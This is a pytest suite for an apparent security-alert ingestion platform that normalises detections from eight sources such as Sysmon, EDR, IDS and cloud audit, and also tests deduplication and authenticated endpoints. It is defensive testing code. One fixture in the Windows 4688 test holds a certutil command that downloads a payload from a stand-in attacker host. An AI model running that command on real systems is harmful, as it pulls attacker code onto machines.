"""
Unit and Integration Tests for AISOP Multi-Source Vendor-Neutral Alert Ingestion.

Governed by ADR-007 (Vendor-Neutral Alert Ingestion).
Verifies:
1. Canonical Alert schemas, taxonomy validations, and CanonicalEvent projections.
2. The 8 canonical vendor adapters against synthetic multi-source fixtures:
   - Windows Sysmon (Process creation, suspicious PowerShell, hashes)
   - Windows Security Events (4625 failed logon / brute force, 4688 process creation)
   - Linux Authentication & Syslog (sshd brute force, sudo abuse)
   - EDR & Malware alerts (CrowdStrike / Defender process injection & hashes)
   - Network IDS & Firewall alerts (Suricata EVE-JSON C2 checkin)
   - Cloud Audit & IAM findings (AWS GuardDuty credential exfiltration)
   - Email Security & Phishing alerts (Proofpoint attachment & link phish)
   - Generic SIEM Correlation alerts (Splunk ES notable incidents)
3. Alert adapter registry resolution, fallback behavior, and custom registration.
4. AlertIngestionService transactional persistence, deduplication, and atomic rollback.
5. API endpoints (POST /api/v1/alerts/ingest and GET /api/v1/alerts/adapters) under authentication and RBAC.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any
import uuid

import httpx
import pytest
from fastapi import FastAPI, status
from sqlalchemy import select

from app.core.config import Settings, get_settings
from app.db.session import get_db_session
from app.main import create_app
from app.models.evidence import ExtractedEntityModel, NormalizedEventModel, RawEvidence
from app.modules.alerts.adapter_protocol import (
    AlertAdapterRegistry,
    BaseAlertAdapter,
    get_default_registry,
)
from app.modules.alerts.adapters.cloud_audit_adapter import CloudAuditAdapter
from app.modules.alerts.adapters.edr_malware_adapter import EdrMalwareAdapter
from app.modules.alerts.adapters.email_phishing_adapter import EmailPhishingAdapter
from app.modules.alerts.adapters.firewall_ids_adapter import NetworkIdsAdapter
from app.modules.alerts.adapters.generic_siem_adapter import GenericSiemAdapter
from app.modules.alerts.adapters.linux_auth_adapter import LinuxAuthAdapter
from app.modules.alerts.adapters.sysmon_adapter import SysmonAlertAdapter
from app.modules.alerts.adapters.windows_security_adapter import WindowsSecurityAdapter
from app.schemas.alert import (
    AlertCategory,
    AlertEntity,
    AlertObservable,
    AlertSeverity,
    CanonicalAlert,
    MitreAttackReference,
)
from app.schemas.alert_ingest import (
    AlertIngestRequest,
    AlertIngestResponse,
    MAX_ALERT_PAYLOAD_BYTES,
)
from app.services.alert_ingestion_service import AlertIngestionService

FIXTURES_DIR = Path(__file__).resolve().parents[3] / "datasets" / "samples" / "alerts"


def load_fixture(filename: str) -> dict[str, Any]:
    fixture_path = FIXTURES_DIR / filename
    assert fixture_path.exists(), f"Fixture file not found: {fixture_path}"
    with open(fixture_path, "r", encoding="utf-8") as f:
        return json.load(f)


# ─────────────────────────────────────────────────────────────────────────────
# 1. Canonical Schema & Contract Tests
# ─────────────────────────────────────────────────────────────────────────────


class TestAlertSchemas:
    """Verifies CanonicalAlert schema invariants and CanonicalEvent projections."""

    def test_canonical_alert_instantiation_and_defaults(self):
        alert = CanonicalAlert(
            source_type="edr_malware",
            source_alert_id="edr-1234",
            title="Suspicious Beacon Activity",
            severity="high",
            provider="CrowdStrike Falcon",
            raw_ref="sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
        )
        assert alert.id is not None
        assert alert.status == "new"
        assert alert.category == "suspicious_activity"
        assert alert.severity == "high"
        assert alert.provider == "CrowdStrike Falcon"
        assert len(alert.entities) == 0
        assert len(alert.observables) == 0

    def test_to_canonical_event_projection_integrity(self):
        alert = CanonicalAlert(
            source_type="sysmon",
            source_alert_id="sysmon-9988",
            title="Suspicious PowerShell Command",
            severity="critical",
            vendor_severity="1",
            category="execution",
            provider="Microsoft-Windows-Sysmon",
            raw_ref="sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
            mitre_attack=[
                MitreAttackReference(
                    tactic_id="TA0002",
                    tactic_name="Execution",
                    technique_id="T1059.001",
                    technique_name="PowerShell",
                )
            ],
            observables=[
                AlertObservable(type="cmdline", value="powershell.exe -enc ...", relevance="suspicious")
            ],
            custom_fields={"custom_tag": "redteam_test"},
        )

        canonical_event = alert.to_canonical_event()
        assert canonical_event.id == alert.id
        assert canonical_event.event_id == "sysmon-9988"
        assert canonical_event.event_type == "alert.execution"
        assert canonical_event.severity == "critical"
        assert canonical_event.provider == "Microsoft-Windows-Sysmon"
        assert canonical_event.action == "alert_triggered"
        assert canonical_event.outcome == "success"
        assert canonical_event.raw_ref == alert.raw_ref
        assert canonical_event.custom_fields["is_alert"] is True
        assert canonical_event.custom_fields["alert_title"] == "Suspicious PowerShell Command"
        assert canonical_event.custom_fields["alert_category"] == "execution"
        assert canonical_event.custom_fields["custom_tag"] == "redteam_test"
        assert len(canonical_event.custom_fields["mitre_attack"]) == 1

    def test_unknown_severity_falls_back_to_informational(self):
        alert = CanonicalAlert(
            source_type="generic_siem",
            source_alert_id="siem-001",
            title="Generic Alert",
            severity="unknown",
            provider="Custom-SIEM",
            raw_ref="sha256:0000000000000000000000000000000000000000000000000000000000000000",
        )
        canonical_event = alert.to_canonical_event()
        assert canonical_event.severity == "informational"

    def test_ingest_request_payload_validation(self):
        # Valid payload passes
        valid_req = AlertIngestRequest(
            source_type="sysmon",
            source_identifier="agent-1",
            alerts=[{"event": "test"}],
        )
        assert len(valid_req.alerts) == 1

        # Non-serializable payload raises ValueError
        with pytest.raises(ValueError, match="non-serializable"):
            AlertIngestRequest(
                source_type="sysmon",
                alerts=[{"bad_obj": object()}],
            )

        # Oversized payload raises ValueError
        huge_str = "A" * (MAX_ALERT_PAYLOAD_BYTES + 1024)
        with pytest.raises(ValueError, match="exceeds maximum allowed payload size"):
            AlertIngestRequest(
                source_type="sysmon",
                alerts=[{"payload": huge_str}],
            )


# ─────────────────────────────────────────────────────────────────────────────
# 2. Multi-Source Adapter Unit Tests (All 8 Sources)
# ─────────────────────────────────────────────────────────────────────────────


class TestAlertAdapters:
    """Tests all 8 concrete adapters against canonical synthetic fixtures."""

    def test_sysmon_adapter_fixture(self):
        fixture = load_fixture("windows_sysmon_alert.json")
        adapter = SysmonAlertAdapter()
        assert adapter.adapter_name() == "sysmon"
        assert adapter.can_adapt(fixture) is True

        alert = adapter.adapt(fixture)
        assert alert.source_type == "sysmon"
        assert alert.category == "execution"
        assert alert.severity == "critical"  # Powershell -enc triggers critical heuristic
        assert alert.provider == "Microsoft-Windows-Sysmon"
        assert alert.host is not None
        assert alert.host.hostname == "DESKTOP-FIN-089.corp.local"
        assert alert.user is not None
        assert alert.user.username == "CORP\\jsmith"
        assert alert.process is not None
        assert "powershell.exe" in alert.process.image_path
        assert "JABzAD0" in alert.process.command_line
        assert alert.process.hashes.get("sha256") == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

        # MITRE ATT&CK parsed from RuleName
        assert len(alert.mitre_attack) > 0
        assert alert.mitre_attack[0].technique_id == "T1059.001"

        # Observables extracted
        obs_types = [o.type for o in alert.observables]
        assert "hash_sha256" in obs_types
        assert "cmdline" in obs_types

    def test_windows_security_adapter_fixture(self):
        fixture = load_fixture("windows_security_event_alert.json")
        adapter = WindowsSecurityAdapter()
        assert adapter.adapter_name() == "windows_security"
        assert adapter.can_adapt(fixture) is True

        alert = adapter.adapt(fixture)
        assert alert.source_type == "windows_security"
        assert alert.category == "credential_access"
        assert alert.severity == "high"
        assert "4625" in alert.title
        assert alert.user is not None
        assert alert.user.username == "Administrator"
        assert alert.host is not None
        assert alert.host.hostname == "DC01.corp.local"
        assert alert.network is not None
        assert alert.network.source_ip == "198.51.100.42"
        assert len(alert.mitre_attack) > 0
        assert alert.mitre_attack[0].technique_id == "T1110.001"

    def test_windows_security_adapter_process_and_audit_clear(self):
        adapter = WindowsSecurityAdapter()
        # 4688 Process Creation
        ev4688 = {
            "Event": {
                "System": {"EventID": 4688, "Computer": "SRV-01"},
                "EventData": {
                    "NewProcessName": "C:\\Windows\\System32\\certutil.exe",
                    "CommandLine": "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
                    "SubjectUserName": "jsmith",
                },
            }
        }
        alert4688 = adapter.adapt(ev4688)
        assert alert4688.category == "execution"
        assert alert4688.process is not None
        assert alert4688.process.process_name == "certutil.exe"

        # 1102 Audit Log Cleared
        ev1102 = {
            "Event": {
                "System": {"EventID": 1102, "Computer": "SRV-01"},
                "EventData": {"SubjectUserName": "attacker"},
            }
        }
        alert1102 = adapter.adapt(ev1102)
        assert alert1102.category == "defense_evasion"
        assert alert1102.severity == "critical"

    def test_linux_auth_adapter_fixture(self):
        fixture = load_fixture("linux_ssh_bruteforce_alert.json")
        adapter = LinuxAuthAdapter()
        assert adapter.adapter_name() == "linux_auth"
        assert adapter.can_adapt(fixture) is True

        alert = adapter.adapt(fixture)
        assert alert.source_type == "linux_auth"
        assert alert.category == "credential_access"
        assert alert.severity == "high"
        assert alert.host is not None
        assert alert.host.hostname == "bastion-prod-01.infra.net"
        assert alert.user is not None
        assert alert.user.username == "admin"
        assert alert.network is not None
        assert alert.network.source_ip == "203.0.113.195"
        assert alert.network.source_port == 44218
        assert alert.mitre_attack[0].technique_id == "T1110.001"

    def test_linux_auth_adapter_raw_syslog_string(self):
        adapter = LinuxAuthAdapter()
        line = "Oct 31 09:12:00 webserver sudo:   jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/bin/bash"
        assert adapter.can_adapt(line) is True
        alert = adapter.adapt(line)
        assert alert.category == "privilege_escalation"
        assert alert.mitre_attack[0].technique_id == "T1548.003"

    def test_edr_malware_adapter_fixture(self):
        fixture = load_fixture("edr_malware_alert.json")
        adapter = EdrMalwareAdapter()
        assert adapter.adapter_name() == "edr_malware"
        assert adapter.can_adapt(fixture) is True

        alert = adapter.adapt(fixture)
        assert alert.source_type == "edr_malware"
        assert alert.category == "malware"
        assert alert.severity == "critical"
        assert alert.provider == "CrowdStrike Falcon"
        assert alert.host is not None
        assert alert.host.hostname == "FIN-LAPTOP-12"
        assert alert.user is not None
        assert alert.user.username == "alice.finance"
        assert alert.file is not None
        assert alert.file.hashes.get("sha256") == "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
        assert alert.mitre_attack[0].technique_id == "T1055.012"
        assert alert.custom_fields["remediation_status"] == "process_killed_and_quarantined"

    def test_network_ids_adapter_fixture(self):
        fixture = load_fixture("firewall_ids_alert.json")
        adapter = NetworkIdsAdapter()
        assert adapter.adapter_name() == "firewall_ids"
        assert adapter.can_adapt(fixture) is True

        alert = adapter.adapt(fixture)
        assert alert.source_type == "firewall_ids"
        assert alert.category == "command_and_control"
        assert alert.severity == "critical"
        assert alert.network is not None
        assert alert.network.source_ip == "10.0.4.15"
        assert alert.network.destination_ip == "198.51.100.88"
        assert alert.network.destination_port == 443
        assert alert.dns is not None
        assert alert.dns.query_name == "cdn-cache-update.evil-c2.net"
        assert alert.mitre_attack[0].technique_id == "T1071.001"

    def test_cloud_audit_adapter_fixture(self):
        fixture = load_fixture("cloud_suspicious_login_alert.json")
        adapter = CloudAuditAdapter()
        assert adapter.adapter_name() == "cloud_audit"
        assert adapter.can_adapt(fixture) is True

        alert = adapter.adapt(fixture)
        assert alert.source_type == "cloud_audit"
        assert alert.severity == "high"  # 8.0 numeric severity maps to high
        assert alert.user is not None
        assert alert.user.username == "ProductionAppServerRole"
        assert alert.network is not None
        assert alert.network.source_ip == "203.0.113.84"
        assert alert.custom_fields["account_id"] == "123456789012"
        assert alert.custom_fields["api"] == "DescribeInstances"
        assert len(alert.mitre_attack) >= 1

    def test_email_phishing_adapter_fixture(self):
        fixture = load_fixture("email_phishing_alert.json")
        adapter = EmailPhishingAdapter()
        assert adapter.adapter_name() == "email_phishing"
        assert adapter.can_adapt(fixture) is True

        alert = adapter.adapt(fixture)
        assert alert.source_type == "email_phishing"
        assert alert.category == "initial_access"
        assert alert.severity == "high"
        assert alert.user is not None
        assert alert.user.username == "bob.finance"
        assert alert.file is not None
        assert alert.file.filename == "Direct_Deposit_Authorization_Form.pdf.iso"
        assert alert.file.hashes.get("sha256") == "8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4"

        # Check extracted entities: sender email, recipient email, sender domain, URL
        entity_types = [e.entity_type for e in alert.entities]
        assert "email" in entity_types
        assert "domain" in entity_types
        assert "url" in entity_types
        assert "file_hash" in entity_types

    def test_generic_siem_adapter_fixture(self):
        fixture = load_fixture("generic_siem_correlation_alert.json")
        adapter = GenericSiemAdapter()
        assert adapter.adapter_name() == "generic_siem"
        assert adapter.can_adapt(fixture) is True

        alert = adapter.adapt(fixture)
        assert alert.source_type == "generic_siem"
        assert alert.category == "credential_access"
        assert alert.severity == "critical"
        assert alert.host is not None
        assert alert.host.hostname == "SRV-PROD-SQL01.corp.local"
        assert alert.user is not None
        assert alert.user.username == "DOMAIN\\SQLAdmin"
        assert alert.network is not None
        assert alert.network.source_ip == "198.51.100.201"
        assert alert.network.destination_ip == "10.0.2.50"

        # Explicit entity list preserved
        entity_values = [e.entity_value for e in alert.entities]
        assert "SRV-PROD-SQL01.corp.local" in entity_values
        assert "DOMAIN\\SQLAdmin" in entity_values
        assert "198.51.100.201" in entity_values


# ─────────────────────────────────────────────────────────────────────────────
# 3. Adapter Registry Tests
# ─────────────────────────────────────────────────────────────────────────────


class TestAlertRegistry:
    """Verifies AlertAdapterRegistry management, discovery, and fallback."""

    def test_default_registry_contains_all_eight_adapters(self):
        registry = get_default_registry()
        expected = [
            "cloud_audit",
            "edr_malware",
            "email_phishing",
            "firewall_ids",
            "generic_siem",
            "linux_auth",
            "sysmon",
            "windows_security",
        ]
        assert registry.list_adapters() == expected

    def test_case_insensitive_lookup(self):
        registry = get_default_registry()
        assert registry.get("SYSMON") is not None
        assert registry.get("Edr_Malware") is not None
        assert registry.get("nonexistent_adapter") is None

    def test_automatic_matching_with_find_matching_adapter(self):
        registry = get_default_registry()
        sysmon_fixture = load_fixture("windows_sysmon_alert.json")
        matched = registry.find_matching_adapter(sysmon_fixture)
        assert matched is not None
        assert matched.adapter_name() == "sysmon"

    def test_custom_adapter_registration(self):
        class CustomHoneyPotAdapter:
            def adapter_name(self) -> str:
                return "honeypot"

            def can_adapt(self, raw_data: dict[str, Any] | str) -> bool:
                return isinstance(raw_data, dict) and "honeypot_trap" in raw_data

            def adapt(self, raw_data: dict[str, Any] | str, raw_ref: str | None = None) -> CanonicalAlert:
                return CanonicalAlert(
                    source_type="honeypot",
                    source_alert_id="hp-1",
                    title="Honeypot Triggered",
                    raw_ref=raw_ref or "sha256:00",
                )

        registry = get_default_registry()
        registry.register(CustomHoneyPotAdapter())
        assert "honeypot" in registry.list_adapters()
        matched = registry.find_matching_adapter({"honeypot_trap": True})
        assert matched is not None
        assert matched.adapter_name() == "honeypot"


# ─────────────────────────────────────────────────────────────────────────────
# 4. Ingestion Service Integration Tests (Database & Deduplication)
# ─────────────────────────────────────────────────────────────────────────────


@pytest.mark.anyio
class TestAlertIngestionService:
    """Verifies end-to-end multi-source alert ingestion, deduplication, and persistence."""

    async def test_single_alert_ingestion_persists_evidence_event_and_entities(self, db_session):
        service = AlertIngestionService()
        fixture = load_fixture("edr_malware_alert.json")
        request = AlertIngestRequest(
            source_type="edr_malware",
            source_identifier="cs-falcon-agent",
            alerts=[fixture],
        )

        response = await service.ingest_batch(db_session, request)

        assert response.total_received == 1
        assert response.total_normalized == 1
        assert response.total_skipped_duplicates == 0
        assert response.total_entities_extracted > 0
        assert len(response.alert_ids) == 1
        assert len(response.errors) == 0

        # Verify DB records
        raw_records = (await db_session.execute(select(RawEvidence))).scalars().all()
        event_records = (await db_session.execute(select(NormalizedEventModel))).scalars().all()
        entity_records = (await db_session.execute(select(ExtractedEntityModel))).scalars().all()

        assert len(raw_records) == 1
        assert len(event_records) == 1
        assert len(entity_records) >= 3

        event = event_records[0]
        assert event.event_type == "alert.malware"
        assert event.severity == "critical"
        assert event.normalized_payload["title"] == "EDR Alert: CobaltStrike.Stager.ProcessHollowing"

    async def test_idempotent_deduplication_exact_duplicate(self, db_session):
        service = AlertIngestionService()
        fixture = load_fixture("firewall_ids_alert.json")
        request = AlertIngestRequest(
            source_type="firewall_ids",
            source_identifier="suricata-sensor",
            alerts=[fixture],
        )

        # First ingestion
        res1 = await service.ingest_batch(db_session, request)
        assert res1.total_normalized == 1
        assert res1.total_skipped_duplicates == 0

        # Second ingestion with identical payload
        res2 = await service.ingest_batch(db_session, request)
        assert res2.total_received == 1
        assert res2.total_normalized == 0
        assert res2.total_skipped_duplicates == 1
        assert len(res2.existing_evidence_ids) == 1

        # Assert no duplicated records in DB
        raw_count = len((await db_session.execute(select(RawEvidence))).scalars().all())
        event_count = len((await db_session.execute(select(NormalizedEventModel))).scalars().all())
        assert raw_count == 1
        assert event_count == 1

    async def test_intra_batch_deduplication(self, db_session):
        service = AlertIngestionService()
        fixture = load_fixture("linux_ssh_bruteforce_alert.json")
        request = AlertIngestRequest(
            source_type="linux_auth",
            source_identifier="bastion-host",
            alerts=[fixture, fixture, fixture],  # 3 identical alerts in one batch
        )

        response = await service.ingest_batch(db_session, request)
        assert response.total_received == 3
        assert response.total_normalized == 1
        assert response.total_skipped_duplicates == 2
        assert len(response.existing_evidence_ids) == 1

    async def test_heterogeneous_batch_ingestion_all_eight_sources(self, db_session):
        service = AlertIngestionService()
        fixtures = [
            ("sysmon", load_fixture("windows_sysmon_alert.json")),
            ("windows_security", load_fixture("windows_security_event_alert.json")),
            ("linux_auth", load_fixture("linux_ssh_bruteforce_alert.json")),
            ("edr_malware", load_fixture("edr_malware_alert.json")),
            ("firewall_ids", load_fixture("firewall_ids_alert.json")),
            ("cloud_audit", load_fixture("cloud_suspicious_login_alert.json")),
            ("email_phishing", load_fixture("email_phishing_alert.json")),
            ("generic_siem", load_fixture("generic_siem_correlation_alert.json")),
        ]

        alerts_list = [f[1] for f in fixtures]
        # Ingest as generic_siem batch with dynamic adapter matching
        request = AlertIngestRequest(
            source_type="generic_siem",
            source_identifier="central-forwarder",
            alerts=alerts_list,
        )

        response = await service.ingest_batch(db_session, request)
        assert response.total_received == 8
        assert response.total_normalized == 8
        assert response.total_skipped_duplicates == 0
        assert len(response.errors) == 0
        assert len(response.alert_ids) == 8

        # Verify all 8 normalized events in database
        event_records = (await db_session.execute(select(NormalizedEventModel))).scalars().all()
        assert len(event_records) == 8

    async def test_empty_batch_handling(self, db_session):
        service = AlertIngestionService()
        request = AlertIngestRequest(
            source_type="sysmon",
            alerts=[],
        )
        response = await service.ingest_batch(db_session, request)
        assert response.total_received == 0
        assert response.total_normalized == 0
        assert len(response.errors) == 0


# ─────────────────────────────────────────────────────────────────────────────
# 5. API Endpoint Tests (POST /ingest & GET /adapters)
# ─────────────────────────────────────────────────────────────────────────────


@pytest.fixture
def test_app(db_session) -> FastAPI:
    """Create test application instance with database and auth overrides."""
    app = create_app()

    async def override_get_db():
        try:
            yield db_session
            await db_session.commit()
        except Exception:
            await db_session.rollback()
            raise

    test_settings = Settings(
        _env_file=None,
        API_AUTH_ENABLED=True,
        API_AUTH_ALLOW_LEGACY_KEYS=True,
        API_AUTH_KEYS=["test-client:test-secret-key-12345"],
    )

    app.dependency_overrides[get_db_session] = override_get_db
    app.dependency_overrides[get_settings] = lambda: test_settings
    return app


@pytest.mark.anyio
class TestAlertApiEndpoints:
    """Tests the alert ingestion and adapter listing REST endpoints."""

    async def test_get_adapters_unauthenticated_rejected(self, test_app: FastAPI):
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=test_app), base_url="http://test"
        ) as client:
            resp = await client.get("/api/v1/alerts/adapters")
            assert resp.status_code == status.HTTP_401_UNAUTHORIZED

    async def test_get_adapters_authenticated_success(self, test_app: FastAPI):
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=test_app), base_url="http://test"
        ) as client:
            resp = await client.get(
                "/api/v1/alerts/adapters",
                headers={"Authorization": "Bearer test-secret-key-12345"},
            )
            assert resp.status_code == status.HTTP_200_OK
            data = resp.json()
            assert data["count"] == 8
            assert "sysmon" in data["adapters"]
            assert "edr_malware" in data["adapters"]
            assert "firewall_ids" in data["adapters"]
            assert "critical" in data["supported_severities"]

    async def test_post_alerts_ingest_authenticated_success(self, test_app: FastAPI):
        fixture = load_fixture("windows_sysmon_alert.json")
        payload = {
            "source_type": "sysmon",
            "source_identifier": "test-host-endpoint",
            "alerts": [fixture],
        }

        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=test_app), base_url="http://test"
        ) as client:
            resp = await client.post(
                "/api/v1/alerts/ingest",
                headers={
                    "Authorization": "Bearer test-secret-key-12345",
                    "Content-Type": "application/json",
                },
                json=payload,
            )
            assert resp.status_code == status.HTTP_200_OK
            data = resp.json()
            assert data["total_received"] == 1
            assert data["total_normalized"] == 1
            assert data["total_skipped_duplicates"] == 0
            assert len(data["alert_ids"]) == 1

    async def test_post_alerts_ingest_unauthenticated_rejected(self, test_app: FastAPI):
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=test_app), base_url="http://test"
        ) as client:
            resp = await client.post(
                "/api/v1/alerts/ingest",
                json={"source_type": "sysmon", "alerts": []},
            )
            assert resp.status_code == status.HTTP_401_UNAUTHORIZED
